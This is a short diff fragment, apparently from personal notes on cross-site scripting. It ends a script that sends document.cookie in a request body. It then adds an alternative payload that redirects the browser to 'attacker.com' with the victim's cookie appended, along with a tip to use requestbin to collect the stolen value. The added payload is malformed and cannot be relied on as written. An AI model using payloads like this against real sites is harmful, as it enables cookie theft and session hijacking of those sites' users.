@@ -24,4 +24,8 @@ body:document.cookie
 });
 </script> we can also try to use different payload than this
 
+like :
+ <script>window.location='http//attacker.com/cookie='document.cookie</script> ----> make ue of requestbin
+
+
 
